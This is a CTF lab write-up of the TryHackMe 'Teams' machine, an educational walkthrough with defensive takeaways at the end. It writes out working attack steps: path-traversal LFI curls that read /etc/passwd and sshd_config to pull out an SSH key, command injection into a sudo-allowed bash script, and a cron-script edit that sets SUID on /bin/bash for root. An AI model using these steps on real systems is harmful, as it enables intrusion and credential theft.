# 🛡️ TryHackMe – Teams - Writeup

## 📌 Overview
**Room Name:** Teams  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Exploitation / LFI / Misconfiguration / Privilege Escalation

Linux machine. LFI on a dev subdomain exposes an SSH private key embedded in `sshd_config`. Input injection and a writable cron script lead to root.

Attack chain overview:

- Virtual Host Discovery (subdomain discovery via vhost enumeration)
- Arbitrary file read via Local File Inclusion (LFI)
- SSH private key extraction from `sshd_config`
- Lateral movement via input injection into a bash script
- Privilege escalation using a world-writable cron script

---

## 🔍 1. Enumeration

### 🔎 Port Scan
An initial scan with `rustscan` revealed the following open ports:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

To access the HTTP service, the domain was added to `/etc/hosts`:

```bash
echo "10.48.161.242 team.thm" | sudo tee -a /etc/hosts
```

### 🕵️ Web Enumeration & Virtual Host Discovery
Visiting `team.thm` displayed the team site's top page. Inspecting the HTML source revealed the following comment:

```html
<!-- Need to update this page more -->
```

The developer left a comment hinting at an unfinished page. Next, `gobuster` was used to enumerate subdomains:

```bash
gobuster vhost -u http://team.thm \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain
```

**Result:** Discovered `dev.team.thm` (Status: 200). Added it to `/etc/hosts`:

```bash
echo "10.48.161.242 dev.team.thm" | sudo tee -a /etc/hosts
```

---

## 🔓 2. Initial Access

### 🔍 LFI Discovery
Visiting `dev.team.thm` redirected to the following URL:

```
http://dev.team.thm/script.php?page=teamshare.php
```

The `?page=` parameter appeared to be passing user input directly as a file path, so LFI was attempted:

```bash
curl "http://dev.team.thm/script.php?page=../../../../etc/passwd"
```

The contents of `/etc/passwd` were returned, confirming the LFI. Checking the source code via `php://filter` revealed completely unfiltered vulnerable code:

```php
<?php
$file = $_GET['page'];
if(isset($file)) {
    include("$file");
} else {
    include("teamshare.php");
}
?>
```

### 🔑 SSH Private Key Extraction
From `/etc/passwd`, users with `/bin/bash` as their login shell were identified: `dale`, `gyles`, and `ubuntu`. Apache configuration files were then read to understand the virtual host setup:

```bash
curl "http://dev.team.thm/script.php?page=../../../../etc/apache2/apache2.conf"
curl "http://dev.team.thm/script.php?page=../../../../etc/apache2/sites-enabled/team.thm.conf"
curl "http://dev.team.thm/script.php?page=../../../../etc/apache2/sites-enabled/dev.team.thm.conf"
```

Reading the SSH configuration file led to a critical discovery:

```bash
curl "http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config"
```

At the bottom of `sshd_config`, the developer had accidentally left `dale`'s SSH private key embedded as a comment:

```
AllowUsers dale gyles root ubuntu
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEA...
#-----END OPENSSH PRIVATE KEY-----
```

The `#` characters were stripped, the private key was saved to a file, and SSH login was performed:

```bash
chmod 600 dale_id_rsa
ssh -i dale_id_rsa dale@10.48.161.242
```

**Initial access as `dale` achieved.** ✅

---

## 🚀 3. Lateral Movement: dale → gyles

### ⚠️ Sudo Misconfiguration & Input Injection
`dale`'s sudo privileges were checked:

```bash
sudo -l
```

```text
User dale may run the following commands on ip-10-48-161-242:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Reviewing the source of `admin_checks` revealed a section that executes user input directly as a command:

```bash
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

Since the `$error` variable is executed as a command without sanitization, arbitrary commands can be injected. `/bin/bash` was launched as `gyles`:

```bash
sudo -u gyles /home/gyles/admin_checks
# name: enter any string
# date prompt: enter /bin/bash

python3 -c "import pty; pty.spawn('/bin/bash');"
```

**Lateral movement to `gyles` achieved.** ✅

---

## 👑 4. Privilege Escalation: gyles → root

### 🔍 World-Writable Cron Script
Checking `gyles`'s groups revealed membership in the `admin` group:

```bash
id
# uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

Files owned by the `admin` group were searched:

```bash
find / -group admin 2>/dev/null
```

`/opt/admin_stuff/script.sh` was found and its contents examined:

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute
dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
$main_site
$dev_site
```

A root cron job runs this script every minute, and it calls `main_backup.sh`. Checking permissions:

```bash
ls -la /usr/local/bin/main_backup.sh
# -rwxrwxr-x 1 root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh
```

The `admin` group has write access. A command to set the SUID bit on `/bin/bash` was appended:

```bash
echo 'chmod +s /bin/bash' >> /usr/local/bin/main_backup.sh
```

After one minute, the SUID bit was confirmed and a root shell was obtained:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ...

/bin/bash -p
whoami
# root
```

**ROOT ACCESS GRANTED.** ✅

---

## 📚 Key Takeaways

- 🌐 **Importance of Virtual Host Enumeration:** The same IP can host different sites under different hostnames. Enumerating vhosts and subdomains is an essential step in initial reconnaissance.

- 📄 **LFI (Local File Inclusion):** Passing unsanitized user input to `include()` allows arbitrary files to be read. This can lead to disclosure of sensitive information such as config files and private keys.

- 🔑 **Credential Mismanagement:** Leaving an SSH private key as a comment in a config file is a fatal mistake. Sensitive information must never be included in code or comments.

- 🛠️ **Input Injection into Bash Scripts:** Executing unsanitized user input as a command allows arbitrary command injection. All user input handling within scripts must be properly validated.

- ⏰ **World-Writable Cron Scripts:** If an unprivileged user can write to a script executed by root, it becomes a foothold for privilege escalation. Permissions on scripts called by cron jobs must be strictly managed.

---

## 🛠️ Tools Used

- `rustscan`
- `gobuster`
- `curl`
- `ssh`, `chmod`
- `python3` (PTY stabilization)
- `find`, `id`, `sudo`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
